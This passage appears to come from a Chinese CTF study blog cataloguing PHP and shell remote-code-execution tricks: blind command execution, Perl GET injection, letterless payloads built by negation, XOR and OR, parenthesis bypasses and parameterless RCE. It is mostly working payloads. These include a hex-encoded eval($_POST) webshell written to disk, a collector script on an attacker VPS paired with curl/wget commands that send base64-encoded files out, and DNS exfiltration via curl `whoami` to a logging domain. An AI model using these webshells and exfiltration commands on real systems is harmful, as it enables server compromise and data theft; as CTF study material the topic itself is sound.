+<h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><h6 id="Ⅰ-复制，压缩，写shell等方法"><a href="#Ⅰ-复制，压缩，写shell等方法" class="headerlink" title="Ⅰ.复制，压缩，写shell等方法"></a>Ⅰ.复制，压缩，写shell等方法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">copy flag.php flag.txt</span><br><span class="line"></span><br><span class="line">mv flag.php flag.txt</span><br><span class="line"></span><br><span class="line">cat flag.php &gt; flag.txt</span><br></pre></td></tr></table></figure>
+
+<h6 id="Ⅱ-压缩方法"><a href="#Ⅱ-压缩方法" class="headerlink" title="Ⅱ.压缩方法"></a>Ⅱ.压缩方法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tar cvf flag.tar flag.php #tar压缩</span><br><span class="line"></span><br><span class="line">tar zcvf flag.tar.gz flag.php  #tar解压</span><br><span class="line"></span><br><span class="line">zip flag.zip flag.php  #zip压缩</span><br><span class="line"></span><br><span class="line">unzip flag.zip  #zip解压</span><br></pre></td></tr></table></figure>
+
+<h6 id="Ⅲ-写shell方法"><a href="#Ⅲ-写shell方法" class="headerlink" title="Ⅲ.写shell方法"></a>Ⅲ.写shell方法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php</span><br><span class="line">(3c3f706870206576616c28245f504f53545b3132335d293b203f3e是&lt;?php eval($_POST[123]); ?&gt;的十六进制编码)</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot; &gt; webshell.php</span><br></pre></td></tr></table></figure>
+
+<h6 id="Ⅳ-在vps上建立记录脚本"><a href="#Ⅳ-在vps上建立记录脚本" class="headerlink" title="Ⅳ.在vps上建立记录脚本"></a>Ⅳ.在vps上建立记录脚本</h6><p>在自己的公网服务器站点根目录写入php文件，内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- record.php --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$data =$_GET[&#x27;data&#x27;];</span><br><span class="line">$f = fopen(&quot;flag.txt&quot;, &quot;w&quot;);</span><br><span class="line">fwrite($f,$data);</span><br><span class="line">fclose($f);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在目标服务器的测试点可以发送下面其中任意一条请求进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://*.*.*.**/record.php?data=`cat flag.php|base64`</span><br><span class="line">wget http://*.*.*.*/record.php?data=`cat flag.php|base64`</span><br></pre></td></tr></table></figure>
+
+<h6 id="Ⅴ-通过http请求"><a href="#Ⅴ-通过http请求" class="headerlink" title="Ⅴ.通过http请求"></a>Ⅴ.通过http请求</h6><p>注意：ping命令不会产生http请求</p>
+<p>1.在公网服务器监听监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 3939</span><br></pre></td></tr></table></figure>
+
+<p>2.向目标服务器发起http请求，执行curl命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=|curl ip:3939</span><br></pre></td></tr></table></figure>
+
+<p>如果向目标服务器发起http请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞。</p>
+<h6 id="Ⅵ-DNS请求"><a href="#Ⅵ-DNS请求" class="headerlink" title="Ⅵ.DNS请求"></a>Ⅵ.DNS请求</h6><p>网址：<a target="_blank" rel="noopener" href="http://ceye.io/records/dns">http://ceye.io/records/dns</a></p>
+<p><img src="https://img-blog.csdnimg.cn/fc0e2d044d0b4c1ba3b4efb7a0520a49.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查看我的Identifier：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48hw0o.ceye.io</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>qwzf.48hw0o.ceye.io</code>，会记录所有收到的域名解析请求</p>
+<p><img src="https://img-blog.csdnimg.cn/8fb28d99c2b74a478d21a94f6fdf208f.png" alt="在这里插入图片描述"></p>
+<p>向目标服务器发起http请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl `whoami`.48hw0o.ceye.io</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/85b4fea33f5f48a19f336f9918fbb882.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/8c0f982ea9c146a3afe2f4791d949ed9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得到root命令，说明测试点存在命令执行</p>
+<p>利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl `命令`.域名</span><br></pre></td></tr></table></figure>
+
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;-- index.php --&gt;&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);include(&quot;flag.php&quot;);$ip=$_REQUEST[&#x27;ip&#x27;];if($ip)&#123;	shell_exec(&quot;ping -c 4 &quot;.$ip);&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=|curl `whoami`.48hw0o.ceye.io</span><br></pre></td></tr></table></figure>
+
+<h6 id="Ⅶ-linux-tee命令"><a href="#Ⅶ-linux-tee命令" class="headerlink" title="Ⅶ.linux tee命令"></a>Ⅶ.linux tee命令</h6><p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。</p>
+<p>用法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee file1 file2 //复制文件ls /|tee 1.txt //命令输出</span><br></pre></td></tr></table></figure>
+
+<h4 id="②-dev-null-2-gt-amp-1类无回显"><a href="#②-dev-null-2-gt-amp-1类无回显" class="headerlink" title="②/dev/null 2&gt;&amp;1类无回显"></a>②/dev/null 2&gt;&amp;1类无回显</h4><p>例题：ctfshow-web入门42</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125; </span><br></pre></td></tr></table></figure>
+
+<p>/dev/null 2&gt;&amp;1主要意思是不进行回显的意思进行命令分隔即可</p>
+<table>
+<thead>
+<tr>
+<th align="center">符号</th>
+<th align="center">功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">；</td>
+<td align="center">分号</td>
+</tr>
+<tr>
+<td align="center">|</td>
+<td align="center">只执行后面那条命令</td>
+</tr>
+<tr>
+<td align="center">||</td>
+<td align="center">只执行前面那条命令</td>
+</tr>
+<tr>
+<td align="center">&amp;</td>
+<td align="center">两条命令都会执行</td>
+</tr>
+<tr>
+<td align="center">&amp;&amp;</td>
+<td align="center">两条命令都会执行</td>
+</tr>
+</tbody></table>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php|| cat flag.php;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-Perl中open命令执行（GET）"><a href="#7-Perl中open命令执行（GET）" class="headerlink" title="7.Perl中open命令执行（GET）"></a>7.Perl中open命令执行（GET）</h3><h4 id="①使用GET读取文件"><a href="#①使用GET读取文件" class="headerlink" title="①使用GET读取文件"></a>①使用GET读取文件</h4><p>如果GET后面跟路径的话，可以直接获取文件或目录内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /root/1010/1</span><br><span class="line">GET /root/1010/1/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/1fbd0a814ec940ad9ba7611c766fa9a6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>读取根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/8813048c68e847c1bbc7e4476498080b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="②使用GET执行命令"><a href="#②使用GET执行命令" class="headerlink" title="②使用GET执行命令"></a>②使用GET执行命令</h4><p>GET底层实现使用的是open函数，而open函数可以执行命令，所以我们可以用GET来执行命令</p>
+<p><a target="_blank" rel="noopener" href="https://c.runoob.com/compile/17">Perl在线工具</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open(FD,&quot;|ls&quot;);</span><br><span class="line">print&lt;FD&gt;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/18b36c8406b148fdacae00b8a440aeb5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>当GET使用file协议的时候就会调用到perl的open函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">GET file:|ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/03fee74a0b734c0f95ecec3f01a4ad5d.png" alt="在这里插入图片描述"><br><strong>PS:必须得满足前面的文件存在才会命令执行，所以我们要创建一个与命令同名的文件</strong></p>
+<p>例子：</p>
+<p><a target="_blank" rel="noopener" href="http://10.10.10.10/">http://10.10.10.10</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line"></span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.10?url=&amp;filename=|/readflag</span><br><span class="line">http://10.10.10.10?url=file:|/readflag&amp;filename=233</span><br><span class="line">http://10.10.10.10/233</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-无数字字母getshell"><a href="#8-无数字字母getshell" class="headerlink" title="8.无数字字母getshell"></a>8.无数字字母getshell</h3><h4 id="①取反"><a href="#①取反" class="headerlink" title="①取反"></a>①取反</h4><p>php可以对汉字取反获得乱码，但大多数会包含一个字母，例如<code>你</code>字取反为<code>B_</code>其中第二位就是大写字母B，所以可以通过这种方法获得字母B</p>
+<p>这里使用羽师傅的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//在命令行中运行</span><br><span class="line">/*author yu22x*/</span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line">echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="②异或"><a href="#②异或" class="headerlink" title="②异或"></a>②异或</h4><p>当过被滤掉字母时，我们可以使用异或运算的方法来拼写字母</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var_dump(&#x27;#&#x27;^&#x27;|&#x27;); //得到字符 _</span><br><span class="line">var_dump(&#x27;.&#x27;^&#x27;~&#x27;); //得到字符 P    </span><br><span class="line">var_dump(&#x27;/&#x27;^&#x27;`&#x27;); //得到字符 0    </span><br><span class="line">var_dump(&#x27;|&#x27;^&#x27;/&#x27;); //得到字符 S    </span><br><span class="line">var_dump(&#x27;&#123;&#x27;^&#x27;/&#x27;); //得到字符 T    </span><br><span class="line">$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);  //变量$__值为字符串&#x27;_POST&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771/article/details/118877462">python异或查询脚本</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771/article/details/118876475">pyhon异或运算转换脚本</a></p>
+<h4 id="③或运算"><a href="#③或运算" class="headerlink" title="③或运算"></a>③或运算</h4><p>原理与异或相同</p>
+<p>这里使用猫神师傅的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 或运算脚本</span><br><span class="line">def solve3(CODE):</span><br><span class="line">    l = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">    n = &#x27;0123456789&#x27;</span><br><span class="line">    operation = input(&quot;Operation:&quot;)</span><br><span class="line">    front = &quot;&quot;</span><br><span class="line">    after = &quot;&quot;</span><br><span class="line">    for i in operation:</span><br><span class="line">        if i.isalpha():</span><br><span class="line">            front += chr(l.index(i) + 1)</span><br><span class="line">            after += chr(64)</span><br><span class="line">        elif i.isdigit():</span><br><span class="line">            front += chr(n.index(i) + 32)</span><br><span class="line">            after += chr(16)</span><br><span class="line">        else:</span><br><span class="line">            front += i</span><br><span class="line">            after += i</span><br><span class="line">    payload = &quot;($_=(\&quot;%13%19%13%14%05%0D\&quot;|\&quot;%40%40%40%40%40%40\&quot;)).($__ = \&quot;&quot; + quote(</span><br><span class="line">        front) + &quot;\&quot;&quot; + &#x27;|&#x27; + &quot;\&quot;&quot; + quote(after) + &quot;\&quot;).($_($__));&quot;</span><br><span class="line">    print(&#x27;payload:&#x27; + payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-过滤括号"><a href="#9-过滤括号" class="headerlink" title="9.过滤括号"></a>9.过滤括号</h3><h4 id="①使用不需要括号的函数"><a href="#①使用不需要括号的函数" class="headerlink" title="①使用不需要括号的函数"></a>①使用不需要括号的函数</h4><h5 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `cat /flag` </span><br></pre></td></tr></table></figure>
+
+<h5 id="require"><a href="#require" class="headerlink" title="require"></a>require</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;/flag&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>②使用取反</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=require~%d0%99%93%9e%98?&gt; </span><br></pre></td></tr></table></figure>
+
+<h3 id="10-无参数RCE"><a href="#10-无参数RCE" class="headerlink" title="10.无参数RCE"></a>10.无参数RCE</h3><p><strong>什么是无参数函数RCE</strong></p>
+<p>我们常用<code>eval($_GET[&#39;code&#39;]);</code>来实现一句换木马和getshell</p>
+<p>但是如果开发者进行了过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    </span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们就无法使用参数，也就无法通过正则的校验</p>
+<p>在此过滤条件下我们只能执行如下格式的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a();</span><br><span class="line">a(b());</span><br></pre></td></tr></table></figure>
+
+<p>不可使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a(&#x27;abc&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="①getenv"><a href="#①getenv" class="headerlink" title="①getenv()"></a>①getenv()</h4><p>使用getenv()获取一个环境变量的值</p>
+<p><img src="https://img-blog.csdnimg.cn/db507cf055d94726a01c48212521e966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>使用array_rand()来取出数组</p>
+<p><img src="https://img-blog.csdnimg.cn/b75f8959223f48949f8dd20f54a92fc1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>使用arrat_flip()来取出数组中的值</p>
+<p><img src="https://img-blog.csdnimg.cn/4d69eab128aa4ea1a029df48500f4bbb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>注意每次运行输出的字符串是随机的</p>
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test = array(&#x27;1&#x27;, &#x27;2&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;flag&#x27;, &#x27;C1yas0&#x27;, &#x27;admin&#x27;, &#x27;hello&#x27;);</span><br><span class="line">for ($i = 0; $i &lt; 10; $i++) &#123;</span><br><span class="line">    var_dump(array_rand(array_flip($test)));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/0388db371eb4405bb0fadbe1572f4e4e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bcef5dabc3694555b05d7f92a739228d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="②getallheaders"><a href="#②getallheaders" class="headerlink" title="②getallheaders()"></a>②getallheaders()</h4><p>获取所有环境变量的列表，可以看到，成功返回了http header，我们可以在header中自定义内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=var_dump(getallheaders());</span><br><span class="line"></span><br><span class="line">hacker: phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/be31a133626144f7bb98c2bed22faaa2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/dad304b35b13473dacb69b0be1a7e444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="③get-defined-vars"><a href="#③get-defined-vars" class="headerlink" title="③get_defined_vars()"></a>③get_defined_vars()</h4><p>get_defined_vars()可以回显全局变量<code>_GET $_POST $_FILES $_COOKIE</code></p>
+<p>可以利用<code>$_GET</code>进行RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=var_dump(current(get_defined_vars()));&amp;hacker=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/5f0a18801b9648f0954451b0e5f26407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="④session-id"><a href="#④session-id" class="headerlink" title="④session_id()"></a>④session_id()</h4><p><img src="https://img-blog.csdnimg.cn/5b50dd7f214c49078f79d1872e76d5da.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>SESSIONID只能为字母和数字，所以我们可以用十六进制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=706870696e666f28293b</span><br><span class="line">(706870696e666f28293b为phpinfo();的十六进制编码)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/04f2c96c819c47ec9755bd7b0d5ef89f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="⑤dirname-amp-chdir"><a href="#⑤dirname-amp-chdir" class="headerlink" title="⑤dirname() &amp; chdir()"></a>⑤dirname() &amp; chdir()</h4><p>我们可以利用<code>getcwd()</code>获取当前目录</p>
+<p><img src="https://img-blog.csdnimg.cn/e04f919f72684b529f21194050d6f2b4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用<code>dirname()</code>返回上级目录<br><img src="https://img-blog.csdnimg.cn/5f916fc13dd747cab2947ee6c0b254dc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>使用chdir(dirname(getcwd()))来更改目录</p>
+<p>最终paylocd：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-内敛执行"><a href="#11-内敛执行" class="headerlink" title="11.内敛执行"></a>11.内敛执行</h3><p>将``或$()内命令的输出作为输入执行</p>
+<p>常用payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo `ls`;</span><br><span class="line">echo $(ls);</span><br><span class="line">?&gt;&lt;?=`ls`;</span><br><span class="line">?&gt;&lt;?=$(ls);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/37a52848531f4c56854041ebc181b2eb.png" alt="在这里插入图片描述"></p>
+<h3 id="12-open-basedir绕过"><a href="#12-open-basedir绕过" class="headerlink" title="12.open_basedir绕过"></a>12.open_basedir绕过</h3><h4 id="①利用chdir-与ini-set-组合绕过"><a href="#①利用chdir-与ini-set-组合绕过" class="headerlink" title="①利用chdir()与ini_set()组合绕过"></a>①利用chdir()与ini_set()组合绕过</h4><p>使用chdir(‘img’)到文件的子目录</p>
+<p>获取目录：</p>
